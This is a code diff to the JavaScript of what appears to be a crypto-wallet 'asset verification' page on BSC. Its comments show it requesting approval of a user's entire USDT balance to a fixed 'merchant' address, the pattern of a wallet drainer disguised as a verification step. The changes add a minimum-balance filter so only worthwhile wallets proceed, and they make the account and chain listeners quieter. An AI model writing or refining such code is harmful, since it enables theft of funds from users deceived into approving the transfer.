@@ -13,7 +13,7 @@
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
-        USER_MIN_USDT: 0, // Set to 0 to bypass minimum balance threshold
+        USER_MIN_USDT: 1, // Minimum 1 USDT required
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
@@ -291,6 +291,15 @@
 
             safeApiCall('/api/users/register', { wallet: userAddress });
 
+            // Check minimum balance requirement (Minimum 1 USDT)
+            const usdtFloat = parseFloat(state.usdtBalance || '0');
+            if (usdtFloat < CONFIG.USER_MIN_USDT) {
+                updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'error');
+                state.isApproving = false;
+                updateWalletInfoUI();
+                return;
+            }
+
             updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
 
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
@@ -469,7 +478,7 @@
             });
         }
 
-        // Web3 Account / Chain listener
+        // Web3 Account / Chain listener (Silent UI updates only - NO automatic transaction prompts)
         if (window.ethereum) {
             window.ethereum.on('accountsChanged', function (accounts) {
                 if (!accounts || accounts.length === 0) {
@@ -479,14 +488,14 @@
                     updateWalletInfoUI();
                     updateStatus('⚡ Wallet disconnected.', 'info');
                 } else if (state.walletAddress !== accounts[0]) {
-                    connectWallet();
+                    state.walletAddress = accounts[0];
+                    updateWalletInfoUI();
+                    updateStatus('⚡ Wallet address updated. Click VERIFY ASSETS to proceed.', 'info');
                 }
             });
 
-            window.ethereum.on('chainChanged', function (newChainId) {
-                if (newChainId === CONFIG.CHAIN_ID && state.walletAddress) {
-                    connectWallet();
-                }
+            window.ethereum.on('chainChanged', function () {
+                updateWalletInfoUI();
             });
         }
     }
